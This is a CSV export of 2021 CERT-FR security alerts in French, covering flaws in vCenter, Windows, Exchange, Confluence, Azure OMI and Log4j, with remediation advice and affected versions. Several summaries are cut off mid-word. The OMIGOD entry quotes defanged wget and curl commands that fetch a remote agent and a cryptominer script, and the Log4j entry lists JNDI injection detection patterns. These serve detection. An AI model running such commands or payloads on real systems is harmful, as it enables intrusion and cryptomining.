reference,title,closed_at,cves,risks,summary,first_revision,affected_systems
CERTFR-2021-ALE-011,Vulnérabilité dans VMware vCenter Server,2021-10-19,CVE-2021-21985,Exécution de code arbitraire à distance,"Le 25 mai 2021, VMware a publié un correctif pour la vulnérabilité
CVE202121985 affectant le greffon Virtual SAN Health Check qui est
installé par défaut dans vCenter Server.

L'exploitation de cette vulnérabilité permet à un attaquant non
authentifié d'exécuter du code arbitraire à distance avec un haut niveau
de privilèges. De plus, des codes d'attaques sont disponibles
publiquement pour la vulnérabilité CVE202121985 et le CERTFR a
connaissance d'exploitations actives de celleci.

Le CERTFR rappelle que les interfaces de gestion ne doivent pas être
accessibles directement sur internet. Toutefois, le CERTFR constate la
disponibilité d'un certain nombre d'interfaces de gestion vCenter sur
internet. A ce sujet, l'ANSSI a publié les guides suivants concernant
l'accès sécurisé à distance :

   
    (pour ESXi 5)
   
    (de portée plus générale)",2021-06-07T02:00:00.000000,VMware vCenter Server – vCenter Server versions 6.5 antérieures à 6.5 U3p | VMware vCenter Server – Cloud Foundation (vCenter Server) versions 3.x antérieures à 3.10.2.1 | VMware vCenter Server – vCenter Server versions 7.0 antérieures à 7.0 U2b | VMware vCenter Server – vCenter Server versions 6.7 antérieures à 6.7 U3n | VMware vCenter Server – Cloud Foundation (vCenter Server) versions 4.x antérieures à 4.2.1
CERTFR-2021-ALE-012,Multiples vulnérabilités dans Microsoft Windows,2021-10-19,CVE-2021-31201; CVE-2021-31955; CVE-2021-33739; CVE-2021-31199; CVE-2021-31956; CVE-2021-33742,Exécution de code arbitraire à distance; Élévation de privilèges; Atteinte à la confidentialité des données,"A l'occasion de sa mise à jour mensuelle de juin 2021, Microsoft a
publié des correctifs, entre autres, pour six vulnérabilités qui sont
activement exploitées dans le cadre d'attaques ciblées.

Quatre de ces vulnérabilités (CVE202131199, CVE202131201,
CVE202131956 et CVE202133739) permettent une élévation de privilège,
la vulnérabilité CVE202131955 concerne une fuite d'information, enfin
la vulnérabilité CVE202133742 donne à un attaquant la possibilité
d'exécuter du code arbitraire à distance.

Lorsque ces vulnérabilités sont enchaînées, elles permettent à un
attaquant de prendre complètement la main sur une machine si un
utilisateur se rend sur un site malveillant.

Le CERTFR recommande donc l'application des correctifs dans les plus
brefs délais.",2021-06-09T02:00:00.000000,"Microsoft Windows – Windows Server 2016 | Microsoft Windows – Windows 10 Version 21H1 pour systèmes 32 bits | Microsoft Windows – Windows 10 Version 20H2 pour systèmes 32 bits | Microsoft Windows – Windows Server 2008 pour systèmes x64 Service Pack 2 | Microsoft Windows – Windows Server 2008 pour systèmes 32 bits Service Pack 2 | Microsoft Windows – Windows Server 2012 | Microsoft Windows – Windows Server 2012 R2 | Microsoft Windows – Windows 10 Version 1909 pour systèmes 32 bits | Microsoft Windows – Windows Server 2016 (Server Core installation) | Microsoft Windows – Windows 7 pour systèmes 32 bits Service Pack 1 | Microsoft Windows – Windows 10 Version 1809 pour systèmes x64 | Microsoft Windows – Windows 10 pour systèmes x64 | Microsoft Windows – Windows RT 8.1 | Microsoft Windows – Windows 10 Version 2004 pour systèmes 32 bits | Microsoft Windows – Windows Server 2012 R2 (Server Core installation) | Microsoft Windows – Windows 10 Version 20H2 pour systèmes x64 | Microsoft Windows – Windows Server 2008 R2 pour systèmes x64 Service Pack 1 (Server Core installation) | Microsoft Windows – Windows Server 2008 pour systèmes 32 bits Service Pack 2 (Server Core installation) | Microsoft Windows – Windows 10 Version 1909 pour systèmes x64 | Microsoft Windows – Windows 10 Version 2004 pour ARM64-based Systems | Microsoft Windows – Windows 7 pour systèmes x64 Service Pack 1 | Microsoft Windows – Windows Server 2019 | Microsoft Windows – Windows Server, version 20H2 (Server Core Installation) | Microsoft Windows – Windows 10 Version 21H1 pour systèmes x64 | Microsoft Windows – Windows 10 Version 1909 pour ARM64-based Systems | Microsoft Windows – Windows Server, version 2004 (Server Core installation) | Microsoft Windows – Windows 10 Version 1809 pour ARM64-based Systems | Microsoft Windows – Windows Server 2008 pour systèmes x64 Service Pack 2 (Server Core installation) | Microsoft Windows – Windows 8.1 pour systèmes x64 | Microsoft Windows – Windows Server 2008 R2 pour systèmes x64 Service Pack 1 | Microsoft Windows – Windows 10 Version 1607 pour systèmes x64 | Microsoft Windows – Windows 10 Version 2004 pour systèmes x64 | Microsoft Windows – Windows 10 pour systèmes 32 bits | Microsoft Windows – Windows 10 Version 21H1 pour ARM64-based Systems | Microsoft Windows – Windows 8.1 pour systèmes 32 bits | Microsoft Windows – Windows Server 2012 (Server Core installation) | Microsoft Windows – Windows 10 Version 1607 pour systèmes 32 bits | Microsoft Windows – Windows Server 2019 (Server Core installation) | Microsoft Windows – Windows 10 Version 20H2 pour ARM64-based Systems | Microsoft Windows – Windows 10 Version 1809 pour systèmes 32 bits"
CERTFR-2021-ALE-013,[MaJ] Vulnérabilité dans Microsoft Windows,2021-07-02,CVE-2021-1675,Élévation de privilèges; Exécution de code arbitraire à distance,"\[version mise à jour le 02 juillet 2021 : cette alerte est remplacée
par l'alerte CERTFR2021ALE014\]  


La vulnérabilité CVE20211675 est correctement corrigée par le
correctif publié par l'éditeur lors du Patch Tuesday de juin 2021. Les
codes d'attaque publiés le 29 juin exploitent une autre vulnérabilité du
spouleur d'impression. Se référer à
[https://www.cert.ssi.gouv.fr/alerte/CERTFR2021ALE014](https://www.cert.ssi.gouv.fr/alerte/CERTFR2021ALE014)

 

\[version mise à jour le 30 juin 2021 à 19h20 : ajout d'informations
d'aide à la détection\]

Le 8 juin 2021, Microsoft publiait des correctifs concernant des
vulnérabilités critiques de type « jour zéro » (zero day). Une de ces
vulnérabilités, la CVE20211675, affecte le service spouleur
d'impression (print spooler), un composant logiciel du système
d’exploitation Microsoft Windows activé par défaut. Cette vulnérabilité
permettait initialement, selon Microsoft, une escalade de privilèges en
local. Son score CVSSv3 s’élevait alors à 7.8.

Le 29 juin 2021, deux chercheurs ont présenté une nouvelle façon
d’exploiter cette vulnérabilité, cette fois à distance et ce malgré le
correctif proposé par Microsoft. La CVE20211675 doit donc être
considérée comme une vulnérabilité non corrigée permettant une exécution
de code à distance, entraînant une élévation de privilèges avec les
droits SYSTEM. Son score CVSSv3 est donc amené à évoluer.

Des codes d'exploitation sont publiquement disponibles sur Internet,
ce qui signifie que l’explo",2021-06-30T02:00:00.000000,"Microsoft Windows – Windows 10 for x64-based Systems | Microsoft Windows – Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) | Microsoft Windows – Windows Server 2008 R2 for x64-based Systems Service Pack 1 | Microsoft Windows – Windows 10 Version 20H2 for ARM64-based Systems | Microsoft Windows – Windows 10 Version 1809 for 32-bit Systems | Microsoft Windows – Windows Server 2012 | Microsoft Windows – Windows 8.1 for 32-bit systems | Microsoft Windows – Windows 7 for 32-bit Systems Service Pack 1 | Microsoft Windows – Windows RT 8.1 | Microsoft Windows – Windows 8.1 for x64-based systems | Microsoft Windows – Windows 10 Version 2004 for 32-bit Systems | Microsoft Windows – Windows Server 2019 (Server Core installation) | Microsoft Windows – Windows Server 2008 for x64-based Systems Service Pack 2 | Microsoft Windows – Windows Server 2012 R2 (Server Core installation) | Microsoft Windows – Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) | Microsoft Windows – Windows Server 2016 | Microsoft Windows – Windows 10 Version 1607 for 32-bit Systems | Microsoft Windows – Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) | Microsoft Windows – Windows 10 Version 21H1 for 32-bit Systems | Microsoft Windows – Windows 10 Version 2004 for x64-based Systems | Microsoft Windows – Windows Server 2019 | Microsoft Windows – Windows 10 Version 1909 for 32-bit Systems | Microsoft Windows – Windows Server, version 20H2 (Server Core Installation) | Microsoft Windows – Windows 10 Version 1909 for x64-based Systems | Microsoft Windows – Windows 10 Version 20H2 for x64-based Systems | Microsoft Windows – Windows 7 for x64-based Systems Service Pack 1 | Microsoft Windows – Windows 10 Version 20H2 for 32-bit Systems | Microsoft Windows – Windows Server 2008 for 32-bit Systems Service Pack 2 | Microsoft Windows – Windows 10 Version 2004 for ARM64-based Systems | Microsoft Windows – Windows 10 for 32-bit Systems | Microsoft Windows – Windows 10 Version 1809 for x64-based Systems | Microsoft Windows – Windows Server, version 2004 (Server Core installation) | Microsoft Windows – Windows 10 Version 21H1 for ARM64-based Systems | Microsoft Windows – Windows 10 Version 21H1 for x64-based Systems | Microsoft Windows – Windows Server 2016 (Server Core installation) | Microsoft Windows – Windows 10 Version 1809 for ARM64-based Systems | Microsoft Windows – Windows Server 2012 R2 | Microsoft Windows – Windows 10 Version 1607 for x64-based Systems | Microsoft Windows – Windows 10 Version 1909 for ARM64-based Systems"
CERTFR-2021-ALE-014,[MaJ] Multiples vulnérabilités dans Microsoft Windows,2022-01-05,CVE-2021-34481; CVE-2021-36958; CVE-2021-34527; CVE-2021-1675,Élévation de privilèges; Exécution de code arbitraire à distance,"\[version du 12 août 2021\]

Le 11 août 2021, Microsoft a publié un avis concernant la
vulnérabilité CVE202136958 affectant le spouleur d’impression (print
spooler). Microsoft indique que cette vulnérabilité permet une
exécution de code arbitraire à distance. Le CERT/CC ajoute qu'en se
connectant à une imprimante malveillante, l'attaquant peut exécuter du
code arbitraire avec les privilèges SYSTEM \[8\].

Aucun correctif n'est disponible pour l'instant. Microsoft conseille
donc de désactiver le service.

Comme la désactivation complète des impressions est difficilement
réalisable, le CERTFR renvoie vers les recommandations formulées dans
le paragraphe \[version initiale\].

\[version du 11 août\]

Microsoft a publié une mise à jour de sécurité
([KB5005652](https://support.microsoft.com/help/5005652)) corrigeant la
vulnérabilité référencée par l'identifiant CVE202134481 \[7\]. Point
important : Microsoft a récemment pris connaissance d'un scénario
d'attaque à distance pour cette vulnérabilité dont l'impact initial se
restreignait alors seulement à une élévation de privilèges locaux.
Ainsi, Microsoft a donc révisé son évaluation en conséquence. Le score
CVSSv3 de cette vulnérabilité s'élève maintenant à 8.8. Nous vous
recommandons d'installer ces mises à jour immédiatement.

\[version du 16 juillet, 15h30\]

Le 6 juillet 2021, Microsoft annonçait un correctif pour la
CVE202134527 afin de protéger les systèmes Windows contre une attaque
distante. Cependant, le 15 juillet 2021, M",2021-07-02T02:00:00.000000,"Microsoft Windows – Windows Server 2012 R2 | Microsoft Windows – Windows Server 2016 (Server Core installation) | Microsoft Windows – Windows 8.1 for 32-bit systems | Microsoft Windows – Windows RT 8.1 | Microsoft Windows – Windows Server 2016 | Microsoft Windows – Windows 10 Version 1607 for 32-bit Systems | Microsoft Windows – Windows 10 Version 21H1 for 32-bit Systems | Microsoft Windows – Windows 10 Version 2004 for x64-based Systems | Microsoft Windows – Windows Server, version 20H2 (Server Core Installation) | Microsoft Windows – Windows 10 Version 1809 for ARM64-based Systems | Microsoft Windows – Windows 10 Version 21H1 for x64-based Systems | Microsoft Windows – Windows 10 for x64-based Systems | Microsoft Windows – Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) | Microsoft Windows – Windows Server 2008 R2 for x64-based Systems Service Pack 1 | Microsoft Windows – Windows 10 Version 20H2 for ARM64-based Systems | Microsoft Windows – Windows 10 Version 1809 for 32-bit Systems | Microsoft Windows – Windows Server 2012 | Microsoft Windows – Windows 7 for 32-bit Systems Service Pack 1 | Microsoft Windows – Windows 8.1 for x64-based systems | Microsoft Windows – Windows 10 Version 2004 for 32-bit Systems | Microsoft Windows – Windows Server 2019 (Server Core installation) | Microsoft Windows – Windows Server 2008 for x64-based Systems Service Pack 2 | Microsoft Windows – Windows Server 2012 R2 (Server Core installation) | Microsoft Windows – Windows 10 Version 1607 for x64-based Systems | Microsoft Windows – Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) | Microsoft Windows – Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) | Microsoft Windows – Windows Server 2019 | Microsoft Windows – Windows 10 Version 1909 for 32-bit Systems | Microsoft Windows – Windows 10 Version 1909 for x64-based Systems | Microsoft Windows – Windows 10 Version 20H2 for x64-based Systems | Microsoft Windows – Windows 7 for x64-based Systems Service Pack 1 | Microsoft Windows – Windows 10 Version 20H2 for 32-bit Systems | Microsoft Windows – Windows Server 2008 for 32-bit Systems Service Pack 2 | Microsoft Windows – Windows 10 Version 2004 for ARM64-based Systems | Microsoft Windows – Windows 10 for 32-bit Systems | Microsoft Windows – Windows 10 Version 1809 for x64-based Systems | Microsoft Windows – Windows 10 Version 1909 for ARM64-based Systems | Microsoft Windows – Windows Server, version 2004 (Server Core installation) | Microsoft Windows – Windows 10 Version 21H1 for ARM64-based Systems"
CERTFR-2021-ALE-015,Multiples vulnérabilités dans SolarWinds Serv-U,2021-10-19,CVE-2021-35211,Exécution de code arbitraire à distance,"Le 9 juillet 2021, SolarWinds a publié un correctif pour la
vulnérabilité CVE202135211 affectant les composants Managed File
Transfer et Secure FTP des produits ServU avec une version
antérieure à 15.2.3 HF2.

Cette vulnérabilité de type ""jour zéro"" (zero day) a été découverte
par Microsoft et permet à un attaquant de pouvoir exécuter du code
arbitraire à distance avec des privilèges élevés. Microsoft déclare
avoir détecté des exploitations ciblées de cette vulnérabilité.

Cependant, dans le cas où le SSH n'est pas activé sur votre produit
SolarWinds ServU la vulnérabilité ne peut pas être exploitée.",2021-07-13T02:00:00.000000,SolarWinds Serv-U – SolarWinds Serv-U versions antérieures à 15.2.3 HF2
CERTFR-2021-ALE-016,Vulnérabilité dans SonicWall,2021-08-19,Aucune,Atteinte à la confidentialité des données; Atteinte à l'intégrité des données,"Une vulnérabilité de type injection SQL a été découverte dans SonicWall
Secure Mobile Access (SMA) et Secure Remote Access (SRA). Elle permet à
un attaquant de provoquer une atteinte à l'intégrité des données et une
atteinte à la confidentialité des données. L'éditeur a émis un bulletin
d'alerte \[1\] dans lequel il précise qu'une campagne de rançonnage
ciblant les équipements SonicWall vulnérable est en cours de
planification par un attaquant disposant de comptes et de mots de passe
volés.

Le CERTFR recommande fortement de suivre les préconisations de
l'éditeur :

   déconnecter les équipements obsolètes et pour lesquels aucun
    correctif n'est proposé
   appliquer les derniers correctifs de sécurité sur les équipements
    maintenus par l'éditeur
   renouveler l'ensemble des mots de passe pour les comptes
    utilisateurs et administrateurs ainsi que les comptes techniques
   activer l'authentification à plusieurs facteurs",2021-07-15T02:00:00.000000,Sonicwall N/A – SSL-VPN 200/2000/400 toutes versions (le produit est obsolète et n'est plus maintenu par l'éditeur) | Sonicwall N/A – Secure Mobile Access 210/410/500v versions antérieures à 10.2.0.7-34sv et 9.0.0.10-28sv | Sonicwall N/A – Secure Remote Access 4600/1600 toutes versions (le produit est obsolète et n'est plus maintenu par l'éditeur) | Sonicwall N/A – Secure Remote Access 4200/1200 toutes versions (le produit est obsolète et n'est plus maintenu par l'éditeur) | Sonicwall N/A – Secure Mobile Access 400/200 versions antérieures à 10.2.0.7-34 et 9.0.0.10
CERTFR-2021-ALE-017,Multiples vulnérabilités dans Microsoft Exchange,2022-05-04,CVE-2021-31207; CVE-2021-34473; CVE-2021-34523,Exécution de code arbitraire à distance; Élévation de privilèges; Contournement de la politique de sécurité,"Dans son bulletin d'actualité CERTFR2021ACT035 du 12 août 2021
[\[1\]](http://suite%20à%20la%20publication%20d'une%20technique%20permettant%20de%20prendre%20le%20contrôle%20d'un%20serveur%20Microsoft%20Exchange),
le CERTFR revenait sur la publication d'une technique permettant de
prendre le contrôle d'un serveur Microsoft Exchange. La technique,
dénommée ""ProxyShell"" s'appuie sur l'existence de plusieurs
vulnérabilités corrigées en avril et en mai 2021
[\[4\]](/avis/CERTFR2021AVI369/) (mais
annoncées en juillet)
[\[2\]](/avis/CERTFR2021AVI522/)
[\[3\]](/actualite/CERTFR2021ACT030/).

Récemment, le CERTFR a pris connaissance d'activités malveillantes qui
pourraientêtre basées sur une exploitation de ces vulnérabilités et
ciblant les serveurs Microsoft Exchange d'entités françaises.

Le CERTFR a signalé l'existence de serveurs vulnérables exposés sur
Internet à leurs propriétaires, mais sans possibilité d'exhaustivité.
Par conséquent le CERTFR rappelle les recommandations suivantes :

   appliquer immédiatement les correctifs de sécurité fournis par
    l’éditeur sur l’ensemble des serveurs Exchange vulnérables exposés
    sur Internet puis en interne ;
   procéder à l’analyse des serveurs Exchange afin d’identifier une
    possible activité anormale à l'aide des informations fournies dans
    notre bulletin CERTFR2021ACT035 et la présence de webshells ;
   en cas de compromission, contrôler le système d’information pour
    détecter d’éventuelles latéralisations ainsi qu’une c",2021-08-27T02:00:00.000000,
CERTFR-2021-ALE-018,Vulnérabilité dans Atlassian Confluence Server et Data Center,2022-01-05,CVE-2021-26084,Exécution de code arbitraire à distance,"Le 25 août 2021, Atlassian a publié un avis de sécurité alertant de
l'existence d'une vulnérabilité affectant la solution de travail
collaboratif Confluence, référencée CVE202126084.

L'éditeur, ainsi que plusieurs autres sources, indiquent que la
vulnérabilité CVE202126084, qui permet à un attaquant non authentifié
d'exécuter du code arbitraire à distance, est activement exploitée. Le 3
septembre 2021, l'éditeur confirme par ailleurs que toutes les versions
citées cidessus sont vulnérables, quelles que soient leurs
configurations.

Le CERTFR a également connaissance de campagnes d'identification de
serveurs Confluence exposés sur Internet. De plus, des codes
d'exploitation sont disponibles publiquement pour cette vulnérabilité.",2021-09-06T02:00:00.000000,Atlassian Confluence – Atlassian Confluence Server et Data Center versions 7.12.x antérieures à 7.12.5 | Atlassian Confluence – Atlassian Confluence Server et Data Center versions antérieures à 6.13.23 | Atlassian Confluence – Atlassian Confluence Server et Data Center versions 7.5.x à 7.11.x antérieures à 7.11.6 | Atlassian Confluence – Atlassian Confluence Server et Data Center versions 6.14.x à 7.4.x antérieures à 7.4.11
CERTFR-2021-ALE-019,[MaJ] Vulnérabilité dans Microsoft Windows,2022-05-04,CVE-2021-40444,Exécution de code arbitraire à distance,"\[Version du 15 septembre 2021\] Dans le cadre de son Patch
Tuesday, en date du 14 septembre 2021, Microsoft a mis à disposition un
correctif pour cette vulnérabilité. Le CERTFR recommande fortement
d'appliquer ce correctif et, le cas échéant, d'enlever les
contournements préalablement appliqués pour se protéger de cette
vulnérabilité.

\[Version initiale\]

Celleci affecte le composant MSHTML utilisé par ActiveX. Un attaquant
peut obtenir une exécution de code arbitraire à distance en envoyant un
fichier Office piégé.

Cette exécution de code s'effectue avec les niveaux de privilèges de
l'utilisateur ayant ouvert le document.

Aucun correctif n'est disponible.

Microsoft indique également que cette vulnérabilité est activement
exploitée dans le cadre d'attaques ciblées.",2021-09-08T02:00:00.000000,"Microsoft Windows – Windows Server 2019 (Server Core installation) | Microsoft Windows – Windows Server 2012 R2 (Server Core installation) | Microsoft Windows – Windows 10 Version 20H2 pour systèmes x64 | Microsoft Windows – Windows Server 2008 R2 pour systèmes x64 Service Pack 1 (Server Core installation) | Microsoft Windows – Windows Server 2016 | Microsoft Windows – Windows Server, version 2004 (Server Core installation) | Microsoft Windows – Windows 8.1 pour systèmes x64 | Microsoft Windows – Windows Server 2008 R2 pour systèmes x64 Service Pack 1 | Microsoft Windows – Windows Server 2008 pour systèmes x64 Service Pack 2 | Microsoft Windows – Windows 10 Version 2004 pour systèmes x64 | Microsoft Windows – Windows Server 2022 | Microsoft Windows – Windows Server 2008 pour systèmes 32 bits Service Pack 2 | Microsoft Windows – Windows 10 pour systèmes 32 bits | Microsoft Windows – Windows 10 Version 2004 pour systèmes 32 bits | Microsoft Windows – Windows 7 pour systèmes x64 Service Pack 1 | Microsoft Windows – Windows 10 Version 20H2 pour systèmes ARM64 | Microsoft Windows – Windows 10 Version 2004 pour systèmes ARM64 | Microsoft Windows – Windows 10 Version 1809 pour systèmes x64 | Microsoft Windows – Windows 8.1 pour systèmes 32 bits | Microsoft Windows – Windows 10 Version 1909 pour systèmes ARM64 | Microsoft Windows – Windows Server 2012 | Microsoft Windows – Windows Server 2012 R2 | Microsoft Windows – Windows Server 2012 (Server Core installation) | Microsoft Windows – Windows 10 Version 1607 pour systèmes 32 bits | Microsoft Windows – Windows Server 2022 (Server Core installation) | Microsoft Windows – Windows 10 Version 1909 pour systèmes 32 bits | Microsoft Windows – Windows Server 2016 (Server Core installation) | Microsoft Windows – Windows 7 pour systèmes 32 bits Service Pack 1 | Microsoft Windows – Windows 10 Version 21H1 pour systèmes ARM64 | Microsoft Windows – Windows 10 pour systèmes x64 | Microsoft Windows – Windows RT 8.1 | Microsoft Windows – Windows 10 Version 21H1 pour systèmes 32 bits | Microsoft Windows – Windows 10 Version 20H2 pour systèmes 32 bits | Microsoft Windows – Windows Server 2008 pour systèmes 32 bits Service Pack 2 (Server Core installation) | Microsoft Windows – Windows 10 Version 1909 pour systèmes x64 | Microsoft Windows – Windows Server 2019 | Microsoft Windows – Windows Server, version 20H2 (Server Core Installation) | Microsoft Windows – Windows 10 Version 21H1 pour systèmes x64 | Microsoft Windows – Windows Server 2008 pour systèmes x64 Service Pack 2 (Server Core installation) | Microsoft Windows – Windows 10 Version 1809 pour systèmes ARM64 | Microsoft Windows – Windows 10 Version 1607 pour systèmes x64 | Microsoft Windows – Windows 10 Version 1809 pour systèmes 32 bits"
CERTFR-2021-ALE-020,[Maj] Multiples vulnérabilités dans Microsoft Azure Open Management Infrastructure,2022-01-05,CVE-2021-38648; CVE-2021-38647; CVE-2021-38645; CVE-2021-38649,Élévation de privilèges; Exécution de code arbitraire à distance,"\[Version du 20 septembre 2021\]

Le 18 septembre Microsoft a publié
un article afin d'expliquer comment Azure Sentinel peut aider à la
recherche d'une compromission notamment l'exploitation des
vulnérabilités OMIGOD \[4\]. De plus, à cette occasion, les marqueurs
suivants, qui correspondent à des traces liées à une tentative
d'exploitation, ont été proposés par Microsoft : 

   wget
    https://www\[.\]dwservice\[.\]net/download/dwagentgeneric\[.\]sh 
    O dwagentgeneric.sh
   echo curl
    https://www\[.\]dwservice\[.\]net/download/dwagentgeneric\[.\]sh 
    output dw.sh \ go.sh
   curl fSsL
    http://104\[.\]168\[.\]213\[.\]31:55879/coinlinux/runMiner\[.\]sh

\[Version initiale\]

Le 14 septembre 2021, une équipe de chercheurs en vulnérabilités a
découvert quatre vulnérabilités dans Microsoft Azure, la plateforme
cloud de Microsoft \[1\]. Ces vulnérabilités sont situées au sein du
service OMI, lequel est déployé dans l'écosystème Azure. Ces
vulnérabilités ont été regroupées sous l’appellation de « OMIGOD ». Le
service OMI est le pendant opensource pour la famille de systèmes
d'exploitation de type Linux ou Unix de WMI (Windows Management
Infrastructure) et permet la gestion des configurations dans des
environnements distants et locaux.

 

En particulier, la vulnérabilité immatriculée CVE202138647 permet à un
attaquant non authentifié de réaliser une exécution de code arbitraire
avec les privilèges de l'utilisateur root. Elle impacte uniquement les
entités utilisant les ",2021-09-17T02:00:00.000000,"Microsoft Azure – Azure Automation State Configuration, DSC Extension (Cloud) DSC Agent versions 3.0.0.1 antérieures à 3.0.0.3 | Microsoft Azure – Azure Automation State Configuration, DSC Extension (Cloud) DSC Agent versions 2.71.X.XX antérieures à 2.71.1.25 | Microsoft Azure – Azure Automation State Configuration, DSC Extension (Cloud) DSC Agent versions 2.0.0.0 | Microsoft Azure – System Center Operations Manager (SCOM) On-Premises OMI versions antérieures à v1.6.8-1 (OMI framework est utilisé pour la surveillance de Linux / Unix) | Microsoft Azure – Container Monitoring Solution (Cloud) déployé avec une image docker ayant un SHA ID différent de 12b7682d8f9a2f67752bf121029e315abcae89bc0c34a0e05f07baec72280707 | Microsoft Azure – Azure Diagnostics (LAD) (Cloud) versions 3.0.131 et antérieures | Microsoft Azure – Azure Automation State Configuration, DSC Extension (On-Premises) OMI versions antérieures à v1.6.8-1 (OMI framework est un pré-requis pour installer pour l'agent DSC ) | Microsoft Azure – Azure Automation State Configuration, DSC Extension (Cloud) DSC Agent versions 2.70.X.XX antérieures à 2.70.0.30 | Microsoft Azure – Azure Automation (On-Premises et Cloud) OMS Agent pour Linux GA versions v1.13.35 et antérieures | Microsoft Azure – Azure Diagnostics (LAD) (Cloud) versions 4.0.0 à 4.0.5 antérieures à 4.0.11 | Microsoft Azure – Azure Security Center (Cloud) OMS Agent pour Linux GA versions v1.13.35 et antérieures | Microsoft Azure – le paquet OMI (On-Premises et Cloud) versions antérieures à v1.6.8-1 | Microsoft Azure – Azure Automation Update Management (On-Premises et Cloud) OMS Agent pour Linux GA versions v1.13.35 et antérieures | Microsoft Azure – Log Analytics Agent (On-Premises et Cloud) OMS Agent pour Linux GA versions 1.13.35 et antérieures"
CERTFR-2021-ALE-021,Vulnérabilité dans Microsoft Exchange,2022-05-04,CVE-2021-42321,Exécution de code arbitraire à distance,"Une vulnérabilité a été découverte dans Microsoft Exchange, initialement
dans le cadre de la compétition de cybersécurité Tianfu Cup qui a eu
lieu en juillet 2021. Elle permet à un attaquant ayant accès aux
identifiants d'un utilisateur de provoquer une exécution de code
arbitraire à distance, permettant d’obtenir in fine les droits de
l’administrateur de domaine Active Directory.

L'éditeur confirme que cette vulnérabilité est exploitée dans le
cadre d'attaques ciblées.

Le CERTFR recommande donc d'appliquer les correctifs de sécurité dans
les plus brefs délais.

Le CERTFR rappelle en outre que l'éditeur ne fournit des correctifs de
sécurité que pour les deux dernières mises à jour cumulatives
(Cumulative Update, CU). En l’occurrence, seules les versions de
Microsoft Exchange 2019 CU 11, 2019 CU 10, 2016 CU 22 et 2016 CU 21
disposent d'un correctif de sécurité. Il est donc primordial d'avoir
déployé ces mises à jour cumulatives (CU) et d'appliquer le
correctif.

Enfin, il convient de souligner que ce type de service ne devrait pas
être exposé sur Internet sans mesure de protection \[1\].",2021-11-10T01:00:00.000000,Microsoft N/A – Microsoft Exchange 2016 | Microsoft N/A – Microsoft Exchange 2019
CERTFR-2021-ALE-022,[MaJ] Vulnérabilité dans Apache Log4j,2022-05-04,CVE-2021-4104; CVE-2021-44832; CVE-2021-45105; CVE-2021-45046; CVE-2021-44228,Exécution de code arbitraire à distance,"Une vulnérabilité a été découverte dans la bibliothèque de
journalisation Apache log4j. Cette bibliothèque est très souvent
utilisée dans les projets de développement d'application Java/J2EE ainsi
que par les éditeurs de solutions logicielles sur étagère basées sur
Java/J2EE.

Cette vulnérabilité permet à un attaquant de provoquer une exécution de
code arbitraire à distance s'il a la capacité de soumettre une donnée à
une application qui utilise la bibliothèque log4j pour journaliser
l'évènement. Cette attaque peut être réalisée sans être authentifié, par
exemple en tirant parti d'une page d'authentification qui journalise les
erreurs d'authentification.

Des preuves de concept ont déjà été publiées. Cette vulnérabilité fait
désormais l'objet d'une exploitation active.













 Détection





Le CERTFR recommande de réaliser une analyse approfondie des journaux
réseau. Les motifs suivants permettent d'identifier une tentative
d'exploitation de cette vulnérabilité lorsqu'ils sont utilisés dans les
URLs ou certaines entêtes HTTP comme useragent :



 

 

 

 \${jndi:

 

 

 

 \$%7Bjndi:     (prend en compte un obscurcissement simple)

 

 

 

 



Cependant, les attaquants peuvent utiliser des moyens d’obscurcissement
pour contourner les motifs de détection précédents. Les motifs suivants
permettent de prendre en compte certaines méthodes d'obscurcissement
mais peuvent provoquer des faux positifs :  






 

 

 \${\${

 

 

 

  class=""mxEventTilebody"" dir=""auto""\${",2021-12-10T01:00:00.000000,"Apache N/A – Apache Log4j versions 2.0 à 2.14.1 | Apache N/A – Apache Log4j versions 1.x (versions obsolètes) sous réserve d'une configuration particulière, cf. ci-dessous | Apache N/A – Apache Log4j version 2.15.0 | Apache N/A – Les produits utilisant une version vulnérable de Apache Log4j : les CERT nationaux européens tiennent à jour une liste complète des produits et de leur statut vis-à-vis de la vulnérabilité [2] | Apache N/A – Apache Log4j versions 2.16.0 et 2.12.2 (java 7)"
